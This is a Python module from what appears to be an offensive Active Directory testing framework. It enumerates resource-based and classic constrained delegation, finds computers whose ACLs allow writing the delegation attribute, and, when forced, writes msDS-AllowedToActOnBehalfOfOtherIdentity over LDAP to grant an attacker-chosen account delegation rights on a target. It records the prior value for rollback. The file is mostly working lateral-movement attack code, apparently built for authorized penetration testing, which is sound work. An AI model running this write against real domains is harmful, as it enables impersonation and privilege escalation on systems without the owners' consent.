"""Resource-Based Constrained Delegation (RBCD) + classic constrained delegation.

Enumerates:
  - msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
  - msDS-AllowedToDelegateTo + protocol-transition flags (classic constrained)
  - Computers where the operator may write AllowedToAct

Write (set RBCD) requires --force and records pre-state for rollback.
"""

from __future__ import annotations

import json
import logging
from typing import Any

from ldap3 import BASE, SUBTREE
from rich.console import Console

from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import ldap_filter_value
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import SafetyProfile, register_capability
from adaf_attack.core.rollback import record_pre_state
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()
_logger = logging.getLogger(__name__)

ATTR_RBCD = "msDS-AllowedToActOnBehalfOfOtherIdentity"
# Backwards-compatible public alias used by callers and integrations.
ATTR = ATTR_RBCD
ATTR_CONSTRAINED = "msDS-AllowedToDelegateTo"
UAC_TRUSTED_TO_AUTH = 0x01000000
UAC_TRUSTED_FOR_DELEG = 0x00080000


def _parse_security_descriptor_sids(raw: Any) -> list[str]:
    """Extract principal SIDs from a binary SD, with SDDL/text fallback."""
    if raw is None:
        return []
    blob: bytes | None = None
    text = ""
    if isinstance(raw, bytes | bytearray):
        blob = bytes(raw)
        text = blob.decode("latin-1", errors="ignore")
    elif isinstance(raw, str) and raw:
        text = raw
        try:
            blob = bytes.fromhex(raw)
        except ValueError:
            blob = None
    if blob:
        try:
            aces = parse_interesting_aces(blob)
            sids = list(dict.fromkeys(ace.principal_sid for ace in aces if ace.principal_sid))
            if sids:
                return sids
        except Exception:
            _logger.debug("Could not parse RBCD security descriptor", exc_info=True)
    import re

    return list(dict.fromkeys(re.findall(r"S-1-5-\d+(?:-\d+)+", text)))


def _list_attr(entry: Any, name: str) -> list[str]:
    val = getattr(entry, name, None)
    if not val:
        return []
    raw = val.value if hasattr(val, "value") else val
    if raw is None:
        return []
    if isinstance(raw, list | tuple):
        return [str(x) for x in raw]
    return [str(raw)]


@register_capability(
    id="rbcd",
    summary="Enumerate RBCD + constrained delegation; optional set requires --force",
    category="lateral-movement",
    tags=(
        "rbcd",
        "delegation",
        "constrained-delegation",
        "msDS-AllowedToActOnBehalfOfOtherIdentity",
        "protocol-transition",
    ),
    safety=SafetyProfile(),
)
class Rbcd:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        set_on = kwargs.get("set_on") or kwargs.get("computer")
        set_from = kwargs.get("set_from")

        console.print(
            f"[bold]RBCD / constrained delegation[/bold] → {target.domain} @ {target.dc_ip}"
        )
        conn, base_dn, _cfg = ldap_connect(target)

        result: dict[str, Any] = {
            "domain": target.domain,
            "rbcd_configured": [],
            "constrained_delegation": [],
            "writable_computers": [],
            "set_attempt": None,
        }

        # Computers with RBCD already configured
        conn.search(
            base_dn,
            f"(&(objectClass=computer)({ATTR_RBCD}=*))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName", ATTR_RBCD, "dNSHostName"],
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            raw = entry[ATTR_RBCD].value if entry[ATTR_RBCD] else None
            sids = _parse_security_descriptor_sids(raw)
            item = {
                "sam": sam,
                "dn": str(entry.distinguishedName),
                "dns": str(entry.dNSHostName) if entry.dNSHostName else None,
                "allowed_to_act_sids": sids,
            }
            result["rbcd_configured"].append(item)
            comp_id = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(comp_id, "Computer", sam=sam, dn=item["dn"], rbcd=True)
            for sid in sids:
                src = f"SID@{sid}"
                graph.add_node(src, "Base", sid=sid)
                graph.add_edge(src, comp_id, "AllowedToAct", via="RBCD")
            console.print(f"  RBCD [cyan]{sam}[/cyan]  allowed_sids={len(sids)}")

        # Classic constrained delegation + protocol transition
        conn.search(
            base_dn,
            f"(&(|(objectClass=user)(objectClass=computer))({ATTR_CONSTRAINED}=*))",
            search_scope=SUBTREE,
            attributes=[
                "sAMAccountName",
                "distinguishedName",
                "userAccountControl",
                ATTR_CONSTRAINED,
            ],
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            if not sam:
                continue
            spns = _list_attr(entry, ATTR_CONSTRAINED)
            try:
                uac_attr = getattr(entry, "userAccountControl", None)
                uac = int(uac_attr.value) if uac_attr else 0
            except (TypeError, ValueError):
                uac = 0
            constrained_item: dict[str, Any] = {
                "sam": sam,
                "dn": str(entry.distinguishedName),
                "spns": spns,
                "protocol_transition": bool(uac & UAC_TRUSTED_TO_AUTH),
                "unconstrained": bool(uac & UAC_TRUSTED_FOR_DELEG),
            }
            result["constrained_delegation"].append(constrained_item)
            account_id = f"ACCOUNT@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(account_id, "User", sam=sam, dn=constrained_item["dn"])
            graph.add_edge(
                account_id,
                f"DOMAIN@{target.domain.upper()}",
                "AllowedToDelegate",
                spns=spns[:20],
                protocol_transition=constrained_item["protocol_transition"],
            )
            for spn in spns[:15]:
                graph.add_edge(account_id, f"SPN@{spn.upper()}", "CanDelegateTo")
            console.print(
                f"  Constrained [cyan]{sam}[/cyan]  spns={len(spns)}  "
                f"protocol_transition={constrained_item['protocol_transition']}"
            )

        # Computers where we may write AllowedToAct
        conn.search(
            base_dn,
            "(objectClass=computer)",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "distinguishedName"],
            size_limit=int(kwargs.get("max_objects") or 500),
        )
        for entry in conn.entries:
            sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
            dn = str(entry.distinguishedName)
            if not sam:
                continue
            sd = fetch_sd(conn, dn)
            if not sd:
                continue
            try:
                for ace in parse_interesting_aces(sd):
                    if ace.right in (
                        "GenericAll",
                        "GenericWrite",
                        "WriteProperty",
                        "WriteDacl",
                        "WriteOwner",
                    ):
                        result["writable_computers"].append(
                            {
                                "computer": sam,
                                "dn": dn,
                                "principal_sid": ace.principal_sid,
                                "right": ace.right,
                            }
                        )
                        src = f"SID@{ace.principal_sid}"
                        tgt = f"COMPUTER@{sam.upper()}@{target.domain.upper()}"
                        graph.add_node(src, "Base", sid=ace.principal_sid)
                        graph.add_node(tgt, "Computer", sam=sam, dn=dn)
                        graph.add_edge(src, tgt, "WriteRBCD", right=ace.right)
            except Exception:
                _logger.debug("Could not parse computer ACL for RBCD", exc_info=True)

        uniq = {
            (w["computer"], w["principal_sid"], w["right"]) for w in result["writable_computers"]
        }
        console.print(f"  Writable RBCD surfaces: [cyan]{len(uniq)}[/cyan] ACE hits")

        if set_on:
            if not force:
                console.print("[yellow]RBCD set requested without --force — enum only.[/yellow]")
                result["set_attempt"] = {"set_on": set_on, "skipped": "force_required"}
            elif not set_from:
                result["set_attempt"] = {
                    "set_on": set_on,
                    "ok": False,
                    "error": "set_from (controlled computer SAM) required",
                }
            else:
                # Effective-rights evidence: warn if no WriteRBCD edge for this target
                evidence = [
                    w
                    for w in result["writable_computers"]
                    if w["computer"].rstrip("$").lower() == set_on.rstrip("$").lower()
                ]
                if not evidence:
                    console.print(
                        "[yellow]No WriteRBCD ACE observed for this computer in the current "
                        "pass — write may still succeed if rights exist outside scanned scope.[/yellow]"
                    )
                result["set_attempt"] = self._set_rbcd(conn, base_dn, set_on, set_from, session)

        conn.unbind()
        out_path = session.path("rbcd.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "rbcd.complete",
            configured=len(result["rbcd_configured"]),
            constrained=len(result["constrained_delegation"]),
            writable=len(uniq),
        )
        console.print(
            f"[green]Done[/green]  rbcd={len(result['rbcd_configured'])}  "
            f"constrained={len(result['constrained_delegation'])}  "
            f"writable_aces={len(result['writable_computers'])}"
        )
        console.print(f"Results → {out_path}")
        return result

    def _set_rbcd(
        self, conn: Any, base_dn: str, set_on: str, set_from: str, session: Session
    ) -> dict[str, Any]:
        """Set msDS-AllowedToActOnBehalfOfOtherIdentity using an in-process SD."""
        from ldap3 import MODIFY_REPLACE

        from adaf_attack.core.rbcd_sd import build_allowed_to_act_sd, sid_from_ldap_value

        console.print(f"[red]SET RBCD[/red]  {set_from} → AllowedToAct on {set_on}")

        def _lookup(sam: str) -> tuple[str | None, str | None]:
            conn.search(
                base_dn,
                f"(sAMAccountName={ldap_filter_value(sam)})",
                search_scope=SUBTREE,
                attributes=["distinguishedName", "objectSid", ATTR_RBCD],
            )
            if not conn.entries:
                return None, None
            e = conn.entries[0]
            dn = str(e.distinguishedName)
            sid = sid_from_ldap_value(e.objectSid.value if e.objectSid else None)
            return dn, sid

        candidates_on = [set_on, set_on if set_on.endswith("$") else set_on + "$"]
        candidates_from = [set_from, set_from if set_from.endswith("$") else set_from + "$"]
        on_dn = from_sid = None
        for c in candidates_on:
            on_dn, _on_sid = _lookup(c)
            if on_dn:
                break
        for c in candidates_from:
            _from_dn, from_sid = _lookup(c)
            if from_sid:
                break

        if not on_dn or not from_sid:
            return {
                "ok": False,
                "set_on": set_on,
                "set_from": set_from,
                "error": f"lookup failed on_dn={on_dn} from_sid={from_sid}",
            }

        try:
            conn.search(on_dn, "(objectClass=*)", search_scope=BASE, attributes=[ATTR_RBCD])
            previous = (
                list(conn.entries[0][ATTR_RBCD].raw_values)
                if conn.entries and conn.entries[0][ATTR_RBCD]
                else []
            )
            previous_hex = [
                value.hex() if isinstance(value, bytes) else str(value) for value in previous
            ]
            record_pre_state(
                session,
                kind="rbcd",
                target=on_dn,
                previous=previous_hex,
                extra={
                    "rollback": "Restore the recorded msDS-AllowedToActOnBehalfOfOtherIdentity value.",
                    "set_from": set_from,
                },
            )
            sd_bytes = build_allowed_to_act_sd(from_sid)
            ok = conn.modify(on_dn, {ATTR_RBCD: [(MODIFY_REPLACE, [sd_bytes])]})
            result = {
                "ok": bool(ok),
                "ldap_written": bool(ok),
                "ldap_result": str(conn.result),
                "set_on": set_on,
                "set_on_dn": on_dn,
                "set_from": set_from,
                "set_from_sid": from_sid,
                "sd_len": len(sd_bytes),
                "previous": previous_hex,
            }
            if ok:
                console.print(f"  [green]LDAP REPLACE ok[/green]  {ATTR_RBCD} on {on_dn}")
                console.print(f"  allowed SID: {from_sid}")
                console.print("  rollback registered — use: adaf-attack rollback --force")
            else:
                console.print(f"  [red]LDAP modify failed[/red]: {conn.result}")
            return result
        except Exception as exc:
            return {
                "ok": False,
                "set_on": set_on,
                "set_from": set_from,
                "set_from_sid": from_sid,
                "error": str(exc),
            }
